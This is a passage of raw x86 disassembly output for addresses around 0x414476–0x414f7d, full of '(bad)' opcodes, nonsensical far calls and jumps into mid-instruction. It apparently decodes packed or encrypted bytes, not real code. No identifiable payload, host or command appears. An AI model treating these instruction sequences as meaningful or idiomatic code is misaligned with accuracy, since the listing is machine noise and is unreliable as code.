  414476:	stos   BYTE PTR es:[edi],al
  414477:	(bad)  
  414478:	xchg   esi,eax
  414479:	jg     0x414431
  41447b:	xchg   edi,eax
  41447c:	xchg   ebx,eax
  41447d:	fisttp QWORD PTR [esi+0x6c77fd22]
  414483:	xor    ebx,DWORD PTR [esi-0x30]
  414486:	adc    BYTE PTR [edx],ah
  414488:	add    DWORD PTR [edx+0x0],eax
	...
  4144b2:	add    BYTE PTR [eax],al
  4144b4:	inc    eax
  4144b5:	fwait
  4144b6:	xor    BYTE PTR [ecx+0x66cfa83d],0xf7
  4144bd:	sub    ecx,ebp
  4144bf:	test   eax,0x62fe2101
  4144c4:	imul   DWORD PTR ds:0x567c205a
  4144ca:	add    BYTE PTR [esp+eax*8+0x76258235],bl
  4144d1:	mov    BYTE PTR [ebp+0x6a],dl
  4144d4:	jg     0x4144a9
  4144d6:	dec    ecx
  4144d7:	test   al,0x3d
  4144d9:	pop    ebx
  4144da:	jae    0x4144cb
  4144dc:	cwde   
  4144dd:	jg     0x4144a6
  4144df:	sub    ecx,DWORD PTR [esi+0x5b]
  4144e2:	mov    ebp,DWORD PTR [ebp+ebp*1+0x3194fd92]
  4144e9:	xor    edi,DWORD PTR [eax+0xa211898]
  4144ef:	sub    DWORD PTR [ecx-0x29],eax
  4144f2:	sub    ebp,eax
  4144f4:	cmp    eax,0x16c7f5b
  4144f9:	and    bh,dh
  4144fb:	stc    
  4144fc:	cmp    eax,0x3af68152
  414501:	pop    ebx
  414502:	add    dh,dl
  414504:	and    ax,0x54fe
  414508:	loop   0x414543
  41450a:	inc    ebp
  41450b:	sbb    al,0xd9
  41450d:	and    BYTE PTR [edx],cl
  41450f:	test   eax,0xe804d840
  414514:	cmp    eax,0x34fd5b
	...
  414541:	add    BYTE PTR [esi+0x25a17420],bh
  414547:	(bad)  
  414548:	sub    BYTE PTR gs:[edx],bh
  41454b:	xor    edx,edx
  41454d:	xchg   edi,eax
  41454e:	test   al,0x21
  414550:	mov    BYTE PTR [esi+ebp*4],ah
  414553:	and    DWORD PTR [eax+eax*1-0x3d],esi
  414557:	mov    eax,ds:0xd82ff874
  41455c:	inc    cx
  41455e:	pop    ss
  41455f:	mov    ch,0xbd
  414561:	(bad)  
  414562:	nop
  414563:	mov    eax,ds:0xa18f4588
  414568:	je     0x414566
  41456a:	nop
  41456b:	and    esi,esi
  41456d:	push   0x4139b5
  414572:	jg     0x41455f
  414574:	sti    
  414575:	inc    DWORD PTR [eax+0x64e444cf]
  41457b:	pop    ebx
  41457c:	in     al,dx
  41457d:	add    al,ah
  41457f:	fsubr  DWORD PTR [eax-0x7ea32900]
  414585:	jge    0x4145d6
  414587:	pop    esp
  414588:	or     eax,0x5c3084
  41458d:	add    BYTE PTR [ebx+ebx*2],dl
  414590:	in     al,0x0
  414592:	sbb    al,0x94
  414595:	add    BYTE PTR [edi+0x2f75fd5c],ah
  41459b:	mov    ah,0x61
  41459d:	ss xchg edi,eax
  41459f:	pop    esp
  4145a0:	mov    DWORD PTR [ebp+0x3f],esi
  4145a3:	aad    0xfb
  4145a5:	mov    eax,DWORD PTR [eax]
	...
  4145cf:	add    BYTE PTR [edi-0x73ae1774],ch
  4145d5:	jno    0x41463d
  4145d7:	lods   eax,DWORD PTR ds:[esi]
  4145d8:	push   ebx
  4145d9:	addr16 jb 0x4145e4
  4145dc:	xor    esp,DWORD PTR [ebp+esi*2+0x4]
  4145e0:	xor    esp,DWORD PTR [edi-0x17]
  4145e3:	add    al,0x43
  4145e5:	sbb    al,0x2
  4145e7:	or     dl,bh
  4145e9:	fisubr DWORD PTR ds:0xf9dc5d72
  4145ef:	cmp    DWORD PTR [eax+0x58],ebx
  4145f2:	sub    ah,0x17
  4145f5:	mov    bl,0x3
  4145f7:	cmp    BYTE PTR [esi],0xd6
  4145fa:	sar    DWORD PTR [edi-0x6],0x3b
  4145fe:	inc    edx
  4145ff:	fild   WORD PTR [edx+0x2c]
  414602:	inc    esi
  414603:	test   eax,0x744b2d87
  414608:	clc    
  414609:	dec    edx
  41460a:	mov    DWORD PTR [edx+eiz*8-0x50],ecx
  41460e:	cmc    
  41460f:	out    0xc9,eax
  414611:	out    dx,al
  414612:	popa   
  414613:	(bad)  
  414614:	jnp    0x4145b0
  414616:	add    al,0x0
  414618:	xor    cl,BYTE PTR ds:[edi-0x181df5bc]
  41461f:	add    BYTE PTR [edx+esi*1-0x18],ah
  414623:	jmp    DWORD PTR [edi+0x32]
  414626:	call   0x5e30012a
  41462b:	dec    edi
  41462c:	rol    DWORD PTR [esi],0x8a
  41462f:	dec    edx
  414630:	push   DWORD PTR [ecx]
  414632:	or     eax,eax
	...
  41465c:	add    BYTE PTR [eax],al
  41465e:	sub    dl,BYTE PTR [ecx+eax*4]
  414661:	jl     0x4145e9
  414663:	xor    esi,esi
  414665:	sbb    esp,DWORD PTR [ecx+0x13fe55c6]
  41466b:	jp     0x4146e8
  41466d:	je     0x414609
  41466f:	and    bh,dh
  414671:	jmp    0x4145fc
  414673:	sahf   
  414674:	or     eax,ebp
  414676:	ret    
  414677:	sub    eax,0x7e79fe7d
  41467c:	pop    esp
  41467d:	out    0x67,eax
  41467f:	inc    esi
  414680:	add    al,0x0
  414682:	imul   edi,DWORD PTR [esi+0x70],0x7b7b67e7
  414689:	(bad)  
  41468a:	pop    ecx
  41468b:	pop    esi
  41468c:	ins    BYTE PTR es:[edi],dx
  41468d:	out    0x4f,eax
  41468f:	imul   edi,DWORD PTR [ebx-0x2],0x49
  414693:	pop    esi
  414694:	push   0x7b7b57e7
  414699:	dec    bl
  41469b:	pop    ebx
  41469c:	sub    al,0x74
  41469e:	xor    DWORD PTR [ebx],0x1f28d300
  4146a4:	aaa    
  4146a5:	fdivrp st(6),st
  4146a7:	sbb    esp,ebx
  4146a9:	add    esi,DWORD PTR [ebx-0x2e]
  4146ac:	xchg   ebx,eax
  4146ad:	cmp    ch,0x1f
  4146b0:	adc    al,BYTE PTR [esp+edx*4]
  4146b3:	cwde   
  4146b4:	jbe    0x4146ac
  4146b6:	cmp    DWORD PTR [ebx],esi
  4146b8:	call   0x71603f88
  4146bd:	(bad)  
  4146be:	cmc    
  4146bf:	push   ds
  4146c0:	aad    0xb
	...
  4146ea:	add    BYTE PTR [eax],al
  4146ec:	(bad)  
  4146ed:	jns    0x414743
  4146ef:	jl     0x4146d1
  4146f1:	mov    cl,0xe4
  4146f3:	imul   ecx,DWORD PTR [ebx-0x72],0x46
  4146f7:	jl     0x41473d
  4146f9:	sbb    esi,DWORD PTR [ebp+ebx*1+0x4fbfb36e]
  414700:	add    DWORD PTR [ebx-0x41],ebx
  414703:	add    edi,DWORD PTR [esi]
  414705:	cs data16 jmp 0x414732
  414709:	mov    dh,0xa8
  41470b:	add    ecx,DWORD PTR [esi]
  41470d:	push   ds
  41470e:	popf   
  41470f:	or     edx,DWORD PTR [esi-0x678366c5]
  414715:	xor    ebx,DWORD PTR [ecx+ecx*8-0x70]
  414719:	push   ds
  41471a:	push   ebp
  41471c:	test   DWORD PTR [esi],ebx
  41471e:	jge    0x41472b
  414720:	xchg   esi,eax
  414721:	push   esi
  414722:	lahf   
  414723:	jl     0x41479d
  414725:	adc    al,0xaa
  414727:	add    BYTE PTR [esi],bh
  414729:	mov    BYTE PTR [edx+0x68],dh
  41472c:	mov    esp,0xd7d3d417
  414731:	pop    edx
  414732:	inc    ecx
  414733:	ret    0xa858
  414736:	out    dx,eax
  414737:	imul   esp,DWORD PTR [edi-0x4984416a],0xffffff98
  41473e:	add    BYTE PTR [ebp+0x21325fb1],dh
  414744:	add    ebx,DWORD PTR [esi]
  414746:	jle    0x41472e
  414748:	cmp    eax,0x7f114fa7
  41474d:	mov    ch,0x3f
  41474f:	jmp    0x414754
	...
  414778:	add    BYTE PTR [eax],al
  41477a:	or     al,0x36
  41477c:	int3   
  41477d:	xlat   BYTE PTR ds:[ebx]
  41477e:	cmp    eax,0xea9095b
  414783:	pop    esp
  414784:	jmp    0x66205d77
  414789:	sub    BYTE PTR [edx],bh
  41478b:	xchg   al,ch
  41478d:	sub    eax,0xf2005b2c
  414792:	jge    0x41473e
  414794:	and    DWORD PTR [esi+0x56544e55],esi
  41479a:	gs push ecx
  41479c:	rcl    ch,0x3a
  41479f:	mov    ebp,DWORD PTR [eax-0x17]
  4147a2:	cmp    eax,0x81d1bf2e
  4147a7:	mov    ch,0x3f
  4147a9:	jmp    0xe1b5649b
  4147ae:	and    eax,0x35267146
  4147b3:	and    BYTE PTR ss:[ebx-0x2502e2dc],dh
  4147ba:	std    
  4147bb:	loop   0x4147ba
  4147bd:	push   cs
  4147be:	adc    eax,0x5257f31d
  4147c3:	push   esi
  4147c4:	jae    0x414814
  4147c6:	add    eax,0x8ef6fca7
  4147cb:	push   ebp
  4147cc:	call   0xfe5dc538
  4147d1:	inc    esi
  4147d2:	add    ebx,DWORD PTR [eax*1-0x132f7117]
  4147d9:	push   0xcef60e21
	...
  414806:	add    BYTE PTR [eax],al
  414808:	aam    0xce
  41480a:	inc    ebx
  41480b:	add    BYTE PTR [ebx+0x9],bh
  41480e:	push   DWORD PTR [ebp+0x67]
  414811:	mov    al,ds:0x427f0c74
  414816:	add    BYTE PTR ss:[edi],ah
  414819:	dec    esi
  41481a:	ror    BYTE PTR [edi],0xa2
  41481d:	imul   eax,DWORD PTR [edx],0x0
  414820:	pop    ss
  414821:	call   0x0:0x5917f844
  414828:	loopne 0x414845
  41482a:	out    dx,al
  41482b:	jmp    DWORD PTR [eax]
  41482d:	pop    ecx
  41482e:	add    BYTE PTR [edx+0x17],ch
  414831:	das    
  414832:	(bad)  
  414833:	imul   edx,DWORD PTR [edi],0x228cfe2f
  414839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41483a:	dec    ebp
  41483b:	lea    esp,[edx-0x58]
  41483e:	idiv   bh
  414840:	mov    BYTE PTR [eax],cl
  414842:	push   DWORD PTR [ebp-0x71]
  414845:	mov    eax,ds:0xb17ffc74
  41484a:	xor    al,0x0
  41484c:	out    0x4d,eax
  41484e:	shl    BYTE PTR [edx+eiz*8-0x51],0xf5
  414853:	add    edi,edx
  414855:	pop    eax
  414856:	push   0xfe17df8a
  41485b:	(bad)  
  41485c:	ror    BYTE PTR [eax-0x18],cl
  41485f:	inc    eax
  414860:	fisub  DWORD PTR [ecx-0x77e3af02]
  414866:	mov    WORD PTR [ebp-0x156c9],es
	...
  414894:	add    BYTE PTR [eax],al
  414896:	mov    bh,0x6
  414898:	out    0x30,al
  41489a:	fisub  DWORD PTR [ecx-0x4bed7602]
  4148a0:	idiv   bh
  4148a2:	push   0x584983b1
  4148a7:	mov    ds:0x793458c,al
  4148ac:	data16 sub bh,BYTE PTR [esi]
  4148af:	call   0xf668:0xc758ffc1
  4148b6:	push   ecx
  4148b7:	adc    eax,0xa3a7478
  4148bc:	or     BYTE PTR [ebx+0x41],0xe5
  4148c0:	mov    DWORD PTR [esi+edx*1-0x5b01881b],eax
  4148c7:	xor    ch,dl
  4148c9:	xor    dl,BYTE PTR [esi-0x1400fb8d]
  4148cf:	aad    0x6f
  4148d1:	(bad)  
  4148d2:	sbb    ebp,ecx
  4148d4:	in     eax,dx
  4148d5:	or     esp,DWORD PTR [esi]
  4148d7:	inc    esi
  4148d8:	enter  0x9fe,0xab
  4148dc:	jge    0x4148c5
  4148de:	or     DWORD PTR [ebp+0x5a3e6977],esp
  4148e4:	cmp    ch,BYTE PTR [eax+0x7f]
  4148e7:	xor    bh,BYTE PTR [ecx-0x4c]
  4148ea:	fiadd  DWORD PTR [edi+esi*2+0x5fee1fe]
  4148f1:	call   0xfeba0765
  4148f6:	(bad)  
  4148f7:	scas   al,BYTE PTR es:[edi]
  4148f8:	pusha  
  4148f9:	test   BYTE PTR [eax],0x0
	...
  414924:	leave  
  414925:	pop    esp
  414926:	test   DWORD PTR [edx+ebp*8+0xefe775c],eax
  41492d:	sbb    dl,al
  41492f:	push   DWORD PTR [bx+di]
  414932:	jns    0x4148e8
  414934:	call   0x5be:0xa1fe7744
  41493b:	call   0xfeba078f
  414940:	inc    ebp
  414941:	jb     0x414933
  414943:	sbb    BYTE PTR [ebp-0x7e09afa2],bh
  414949:	and    al,0xfe
  41494b:	je     0x41499b
  41494d:	sub    eax,0x5abb8f32
  414952:	(bad)  
  414953:	jo     0x4149bd
  414955:	sbb    edi,DWORD PTR [eax]
  414957:	ins    BYTE PTR es:[edi],dx
  414958:	arpl   WORD PTR [edx+0x466478d6],dx
  41495e:	loop   0x4149a3
  414960:	int    0x54
  414962:	pop    ss
  414963:	ins    BYTE PTR es:[edi],dx
  414964:	dec    edi
  414965:	xchg   edx,eax
  414966:	mov    esi,0xc7d57878
  41496b:	jo     0x4149a5
  41496d:	sbb    edx,ebp
  41496f:	add    edi,DWORD PTR [esi]
  414971:	pop    ebx
  414972:	adc    DWORD PTR [esi+edx*4],eax
  414975:	mov    al,ds:0x1a21c30f
  41497a:	pop    ebp
  41497b:	adc    BYTE PTR [bp+di],bl
  41497e:	(bad)  
  41497f:	js     0x41490b
  414981:	addr16 (bad) 
  414983:	ins    BYTE PTR es:[edi],dx
  414984:	je     0x4149a0
  414986:	jg     0x414912
	...
  4149b0:	add    BYTE PTR [eax],al
  4149b2:	mov    edx,0xf8787f37
  4149b7:	test   edi,esp
  4149b9:	jmp    0x414a19
  4149bb:	sub    DWORD PTR [eax+0x4bd0e903],0x70
  4149c2:	loopne 0x4149de
  4149c4:	push   edi
  4149c5:	out    dx,al
  4149c6:	inc    ebp
  4149c7:	add    edi,DWORD PTR [eax]
  4149c9:	int3   
  4149ca:	rcr    BYTE PTR [edx],1
  4149cc:	jno    0x414a4c
  4149ce:	stc    
  4149cf:	adc    bh,BYTE PTR [edi]
  4149d1:	js     0x41498f
  4149d3:	fmul   DWORD PTR [edi]
  4149d5:	jo     0x41498f
  4149d7:	sbb    ch,al
  4149d9:	or     BYTE PTR [edx+0x3e03e7ef],bh
  4149df:	or     DWORD PTR [ebx+0x645afeeb],0xffffffbe
  4149e6:	lea    ebp,[ebx+0x1269ae0e]
  4149ec:	pop    es
  4149ed:	js     0x414990
  4149ef:	imul   edi,DWORD PTR [ecx+0x78],0x29006680
  4149f6:	imul   edx,DWORD PTR [esi+0x19e16c81],0xd7bd5f72
  414a00:	in     al,0xd6
  414a02:	jmp    0x679e4b1f
  414a07:	fnstsw WORD PTR [ebx-0x1e71e3f]
  414a0d:	jmp    0xd9a9c86b
  414a12:	cmp    eax,0xb6bf0a
	...
  414a3f:	add    BYTE PTR [edi],ch
  414a41:	(bad)  
  414a42:	call   0xfe5a4917
  414a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a48:	out    dx,eax
  414a49:	add    esi,esi
  414a4b:	sahf   
  414a4c:	test   eax,0xa5e17419
  414a51:	xchg   DWORD PTR [ebx-0x72],eax
  414a54:	mov    DWORD PTR [ecx],ebx
  414a56:	mov    ah,0x8d
  414a58:	cdq    
  414a59:	sbb    esi,edi
  414a5b:	jle    0x414a6c
  414a5d:	(bad)  
  414a5e:	call   0xfe5a4979
  414a63:	outs   dx,BYTE PTR ds:[esi]
  414a64:	out    dx,eax
  414a65:	or     eax,0x118a9cfe
  414a6a:	(bad)  
  414a6b:	pop    esi
  414a6c:	imul   ecx,DWORD PTR [edi-0x5fe3bef8],0xcf494efd
  414a76:	loopne 0x414ab6
  414a78:	push   ecx
  414a79:	sbb    esi,edi
  414a7b:	mov    ah,0x35
  414a7d:	add    ebx,edi
  414a7f:	lods   eax,DWORD PTR ds:[esi]
  414a80:	xor    BYTE PTR [ecx],bl
  414a82:	(bad)  
  414a83:	je     0x414a9b
  414a85:	adc    esi,edi
  414a87:	xor    DWORD PTR es:[edi-0x5f93eef8],ecx
  414a8e:	std    
  414a8f:	push   ss
  414a90:	adc    edi,ecx
  414a92:	rcl    BYTE PTR [esi],1
  414a94:	or     DWORD PTR [ecx],ebx
  414a96:	inc    BYTE PTR [eax]
  414a98:	or     ah,BYTE PTR [esi-0x18]
  414a9b:	and    al,0xda
  414a9d:	nop
  414a9e:	(bad)  
  414a9f:	(bad)  
  414aa0:	cmp    dh,BYTE PTR [edi+0xfff6]
	...
  414ace:	pusha  
  414acf:	test   DWORD PTR [ebx],eax
  414ad1:	dec    eax
  414ad2:	pusha  
  414ad3:	nop
  414ad4:	(bad)  
  414ad5:	mov    ch,0x8f
  414ad7:	mov    dh,bh
  414ad9:	(bad)  
  414ada:	jg     0x414a70
  414adc:	inc    esi
  414add:	inc    DWORD PTR [eax-0x77234b70]
  414ae3:	nop
  414ae4:	(bad)  
  414ae5:	call   0x402371
  414aea:	lock retf 
  414aec:	loope  0x414ae5
  414aee:	loopne 0x414a81
  414af0:	in     eax,0xe5
  414af2:	pop    eax
  414af3:	nop
  414af4:	(bad)  
  414af5:	dec    DWORD PTR [edx-0x4f000954]
  414afb:	test   bh,dl
  414afd:	inc    edi
  414afe:	rcl    BYTE PTR [ecx-0x764c4a02],0xfe
  414b05:	inc    DWORD PTR [eax-0x500f5f5]
  414b0b:	fs call 0xfed2add7
  414b11:	dec    edx
  414b13:	xor    dh,0xff
  414b16:	add    BYTE PTR [ebx+edi*4-0x16e8fb9],0x45
  414b1e:	outs   dx,DWORD PTR ds:[esi]
  414b1f:	xchg   edi,edx
  414b21:	std    
  414b22:	adc    BYTE PTR [ecx-0x7bfc8a02],0xd7
  414b29:	xor    esp,DWORD PTR [edi-0x6c3d38a4]
  414b2f:	pop    esp
  414b30:	push   ebx
  414b31:	mov    eax,DWORD PTR [eax]
	...
  414b5b:	add    BYTE PTR [ebx-0x23],dl
  414b5e:	shl    esp,0x12
  414b61:	sbb    edi,edx
  414b63:	push   eax
  414b64:	ficom  DWORD PTR ds:[eax]
  414b67:	push   0xd5ea01ff
  414b6c:	and    ebx,eax
  414b6e:	add    edi,edi
  414b70:	or     eax,DWORD PTR [esi]
  414b72:	push   0xffffffa5
  414b74:	add    al,0x11
  414b76:	je     0x414b82
  414b78:	jle    0x414b08
  414b7a:	jmp    0xeb03:0x787fbd4f
  414b81:	pop    eax
  414b82:	jae    0x414bb3
  414b84:	leave  
  414b85:	inc    edi
  414b86:	jl     0x414b08
  414b88:	shr    DWORD PTR [ecx],cl
  414b8a:	jno    0x414b8c
  414b8c:	ds add ch,ah
  414b8f:	push   es
  414b90:	jns    0x414bd1
  414b92:	jl     0x414b87
  414b94:	aas    
  414b95:	add    al,BYTE PTR [edx]
  414b97:	jmp    0x414c15
  414b99:	leave  
  414b9a:	in     eax,dx
  414b9b:	not    DWORD PTR [esi+0x3e40ec61]
  414ba1:	xchg   DWORD PTR [ebp-0x1225911d],edi
  414ba7:	xor    bh,BYTE PTR [esi]
  414ba9:	add    al,BYTE PTR [ecx+0x46c3ac3]
  414baf:	lea    edi,[ebx-0x22]
  414bb2:	aam    0x67
  414bb4:	adc    BYTE PTR [ecx-0x3f],ch
  414bb7:	push   eax
  414bb9:	push   cs
  414bba:	push   es
  414bbb:	call   0xfeb6184b
	...
  414be8:	add    BYTE PTR [eax],al
  414bea:	xor    eax,0x6e13f042
  414bef:	sbb    al,BYTE PTR [ebx]
  414bf1:	add    cl,ah
  414bf3:	out    0xd4,eax
  414bf5:	(bad)  
  414bf6:	push   ebx
  414bf7:	or     ch,BYTE PTR [edx+0x3e]
  414bfa:	push   ebx
  414bfb:	pop    ecx
  414bfc:	jae    0x414be5
  414bfe:	imul   ecx,ecx,0x74
  414c01:	(bad)  
  414c02:	mov    cl,0xf6
  414c04:	jns    0x414b88
  414c06:	sub    ebx,DWORD PTR [ebx+0x1f]
  414c09:	add    al,0x2b
  414c0b:	ror    DWORD PTR [edi],cl
  414c0d:	adc    eax,0x4b171801
  414c12:	jg     0x414c76
  414c14:	out    0xce,eax
  414c16:	mov    ah,0x6
  414c18:	imul   eax,DWORD PTR [eax-0x7b],0xffffff84
  414c1c:	out    0xe9,eax
  414c1e:	add    BYTE PTR [eax],bl
  414c20:	jge    0x414c2d
  414c22:	cwd    
  414c24:	mov    ds:0x2ce16874,eax
  414c29:	js     0x414c04
  414c2b:	push   cs
  414c2c:	inc    edi
  414c2d:	ret    
  414c2e:	pop    ecx
  414c2f:	sbb    BYTE PTR ds:0xe799f9a6,bl
  414c35:	je     0x414c09
  414c37:	(bad)  
  414c38:	iret   
  414c39:	jae    0x414c80
  414c3b:	pop    ss
  414c3c:	mov    edi,0x287f2deb
  414c41:	add    al,0xa6
  414c43:	pop    ecx
  414c44:	out    0x3,eax
  414c46:	mov    esi,0x160c1d16
  414c4b:	ss pushf 
  414c4d:	je     0x414c4f
	...
  414c77:	add    BYTE PTR [eax],bl
  414c79:	pop    ss
  414c7a:	frstor [ebp+0x74e79c79]
  414c80:	xchg   edx,eax
  414c81:	arpl   WORD PTR [edi+0x7f17012a],cx
  414c87:	jmp    0x414cc8
  414c89:	pop    ebx
  414c8a:	out    0x83,eax
  414c8c:	lock nop
  414c8e:	fild   QWORD PTR [ebx+0x45]
  414c91:	push   ss
  414c92:	addr16 je 0x414c75
  414c95:	nop
  414c96:	pop    ebx
  414c97:	je     0x414ceb
  414c99:	arpl   WORD PTR [edi],di
  414c9b:	cmp    bh,BYTE PTR [edx+0x16]
  414c9e:	dec    edi
  414c9f:	dec    edx
  414ca0:	call   FWORD PTR [edi-0x19]
  414ca3:	into   
  414ca4:	mov    ah,0x7
  414ca6:	imul   edi,DWORD PTR [edi],0xffffff95
  414ca9:	lods   eax,DWORD PTR ds:[esi]
  414caa:	add    BYTE PTR [esi-0x5e97e959],bl
  414cb0:	xor    cl,BYTE PTR [edi-0x66f9eef8]
  414cb6:	std    
  414cb7:	push   ds
  414cb8:	les    ebx,FWORD PTR [edi-0x18b79504]
  414cbe:	dec    ecx
  414cbf:	test   al,0x3d
  414cc1:	pop    ebx
  414cc2:	or     eax,0x5af86d
  414cc7:	jmp    0xa2d1a48a
  414ccc:	jl     0x414ce4
  414cce:	(bad)  
  414ccf:	fsubp  st(1),st
  414cd1:	aad    0xff
  414cd3:	call   0x817d2715
  414cd8:	cdq    
  414cd9:	fwait
  414cda:	add    cl,ch
	...
  414d04:	add    BYTE PTR [eax],al
  414d06:	cmp    al,0xdf
  414d08:	mov    cl,0xe8
  414d0a:	cmp    eax,0x7204815b
  414d0f:	mov    eax,ds:0x663de93f
  414d14:	test   BYTE PTR [edi+0x6a005b3b],cl
  414d1a:	outs   dx,DWORD PTR ds:[esi]
  414d1b:	mov    bh,0x49
  414d1d:	sub    BYTE PTR [edx],bh
  414d1f:	pop    ebx
  414d20:	or     eax,0x5acb65
  414d25:	jmp    0x22a1a3e2
  414d2a:	add    edx,DWORD PTR [esi]
  414d2c:	(bad)  
  414d2d:	idiv   BYTE PTR [ecx+0x3de8ffe1]
  414d33:	fidivr DWORD PTR [ebx]
  414d35:	or     eax,0xe9009ab1
  414d3a:	cmp    al,0xdf
  414d3c:	jge    0x414d26
  414d3e:	cmp    eax,0xb61c815b
  414d43:	mov    al,ds:0x663de93f
  414d48:	test   bl,bl
  414d4a:	inc    edx
  414d4b:	pop    ebx
  414d4c:	add    BYTE PTR [eax],al
  414d4e:	out    dx,eax
  414d4f:	frstor [ebp+0x41]
  414d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d53:	aaa    
  414d54:	(bad)  
  414d55:	(bad)  
  414d56:	xchg   edx,eax
  414d57:	xchg   ebp,eax
  414d58:	dec    edx
  414d59:	inc    ecx
  414d5a:	xchg   edi,eax
  414d5b:	xchg   esi,eax
  414d5c:	inc    esp
  414d5d:	clc    
  414d5e:	adc    al,0xc
  414d60:	test   BYTE PTR [eax],0xa8
  414d63:	fst    QWORD PTR [ebp+0x1]
  414d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d67:	pop    ecx
  414d68:	sub    esi,esi
	...
  414d92:	add    BYTE PTR [eax],al
  414d94:	ror    DWORD PTR [eax+0x7438f874],1
  414d9a:	nop
  414d9b:	dec    ebx
  414d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d9d:	pop    ecx
  414d9e:	mov    eax,esi
  414da0:	pop    esp
  414da1:	xchg   ebx,eax
  414da2:	je     0x414da9
  414da4:	ds push ecx
  414da6:	(bad)  
  414da7:	call   DWORD PTR [edi-0x6c]
  414daa:	push   ebx
  414dab:	or     al,0xcc
  414dad:	xlat   BYTE PTR ds:[ebx]
  414dae:	gs mov ebp,ebp
  414db1:	cli    
  414db2:	mov    BYTE PTR [ebp+0x73],cl
  414db5:	adc    al,0xff
  414db7:	psrlq  mm5,QWORD PTR [edx-0x1]
  414dbb:	jmp    DWORD PTR [edi]
  414dbd:	mov    eax,0x5927010b
  414dc2:	push   0xfe1e7f87
  414dc7:	inc    BYTE PTR [eax]
  414dc9:	mov    cl,0x33
  414dcb:	xor    DWORD PTR [edi],esp
  414dcd:	pop    ecx
  414dce:	or     eax,eax
  414dd0:	sbb    ah,ah
  414dd2:	icebp  
  414dd3:	add    BYTE PTR [edi],dl
  414dd5:	pop    ecx
  414dd6:	cmp    DWORD PTR [edi+0xf],0xcd840d59
  414ddd:	pop    eax
  414dde:	add    BYTE PTR [eax],al
  414de0:	push   0xb8e80611
  414de5:	and    edi,edi
  414de7:	jmp    FWORD PTR [esi+0x23]
  414dea:	out    dx,al
  414deb:	push   eax
  414ded:	adc    bh,bh
  414def:	jne    0x414e2f
  414df1:	mov    dl,0x72
  414df3:	jbe    0x414e2f
  414df5:	call   0x0:0x4608
	...
  414e20:	add    BYTE PTR [eax],al
  414e22:	rcr    DWORD PTR [ebp-0x3cd96f27],0x1
  414e29:	jmp    FWORD PTR [ebx]
  414e2b:	push   edx
  414e2c:	pop    ecx
  414e2d:	std    
  414e2e:	outs   dx,BYTE PTR ds:[esi]
  414e2f:	add    al,BYTE PTR [edx]
  414e31:	or     edi,DWORD PTR [esi+0xd]
  414e34:	mov    DWORD PTR [ebx+0x6a02023e],esi
  414e3a:	ds jg  0x414e05
  414e3d:	out    0xee,eax
  414e3f:	mov    dh,0xc8
  414e41:	jmp    0x414e31
  414e43:	out    0x1,eax
  414e45:	push   0x3e
  414e47:	in     al,dx
  414e48:	jb     0x414e5e
  414e4a:	(bad)  
  414e4b:	mov    ecx,0x4234ffc4
  414e50:	add    al,BYTE PTR [ecx+ecx*8-0x34fffdfe]
  414e57:	aas    
  414e58:	push   0x5cb7514f
  414e5d:	(bad)  
  414e5e:	rcl    ebp,cl
  414e60:	outs   dx,DWORD PTR ds:[esi]
  414e61:	adc    al,0xe6
  414e63:	dec    eax
  414e64:	sar    edi,0x44
  414e67:	ret    0x77f8
  414e6a:	ret    
  414e6b:	inc    esi
  414e6c:	fs dec edi
  414e6e:	xchg   esp,eax
  414e6f:	add    bl,ah
  414e71:	call   DWORD PTR [edi+0x18ffdc05]
  414e77:	outs   dx,DWORD PTR ds:[esi]
  414e78:	push   0xbb4e2bfe
  414e7d:	inc    eax
  414e7e:	ds stc 
  414e80:	inc    ecx
  414e81:	jae    0x414eeb
  414e83:	(bad)  
  414e85:	fild   WORD PTR [eax]
	...
  414eaf:	add    dh,ah
  414eb1:	pop    esp
  414eb2:	(bad)  
  414eb5:	jp     0x414e7c
  414eb7:	fstp   TBYTE PTR [ebx-0x1eb09bc2]
  414ebd:	pop    edx
  414ebe:	fmul   QWORD PTR [edi+0x67]
  414ec1:	pop    ebx
  414ec2:	ror    DWORD PTR [eax],1
  414ec4:	fs pop ebx
  414ec6:	push   esi
  414ec7:	neg    ebp
  414ec9:	adc    esi,ebp
  414ecb:	iret   
  414ecc:	je     0x414e68
  414ece:	out    0xfc,eax
  414ed0:	stc    
  414ed1:	mov    ss,WORD PTR [eax]
  414ed3:	fdiv   QWORD PTR [ecx-0x574db8ed]
  414ed9:	(bad)  
  414eda:	fistp  WORD PTR [ebx-0x78]
  414edd:	cdq    
  414ede:	es jno 0x414e79
  414ee1:	mov    edi,gs
  414ee3:	jo     0x414ef0
  414ee5:	pop    edi
  414ee6:	push   ss
  414ee7:	test   DWORD PTR [ecx+0x3],0x1380c30f
  414eee:	pop    es
  414eef:	neg    DWORD PTR [ecx+0x704f7513]
  414ef5:	(bad)  
  414ef6:	fistp  WORD PTR [ebx+0x6e]
  414ef9:	cdq    
  414efa:	out    dx,al
  414efb:	jo     0x414f5d
  414efd:	(bad)  
  414efe:	ret    
  414eff:	pop    ebx
  414f00:	aas    
  414f01:	sahf   
  414f02:	fidiv  WORD PTR [eax+0x50]
  414f05:	(bad)  
  414f06:	retf   
  414f07:	jo     0x414f3b
  414f09:	jnp    0x414f2d
  414f0b:	ret    
  414f0c:	inc    ecx
  414f0d:	and    edi,0xbeffb270
  414f13:	push   ss
	...
  414f3c:	add    BYTE PTR [eax],al
  414f3e:	call   0xb789:0x290428a6
  414f45:	pop    ebx
  414f46:	sbb    ebx,DWORD PTR [eax+0x1abc70a6]
  414f4c:	clc    
  414f4d:	jo     0x414ed1
  414f4f:	pop    es
  414f50:	imul   ebp,esi,0xd
  414f53:	pop    esp
  414f54:	fiadd  WORD PTR [esi+0x70871219]
  414f5a:	out    0xc8,al
  414f5c:	jge    0x414fce
  414f5e:	lock test DWORD PTR [eax],eax
  414f61:	jmp    0x6f39d6d4
  414f66:	dec    eax
  414f67:	out    0x49,eax
  414f69:	test   al,0x3d
  414f6b:	adc    dh,BYTE PTR [ebp+ebx*2+0x4e]
  414f6f:	xchg   DWORD PTR [eax],ecx
  414f71:	inc    ecx
  414f72:	adc    al,0x9d
  414f74:	std    
  414f75:	dec    esi
  414f76:	out    dx,al
  414f77:	mov    al,0xc7
  414f79:	sub    eax,DWORD PTR [ecx+0x5b]
  414f7c:	push   ebx
  414f7d:	jb     0x414f90
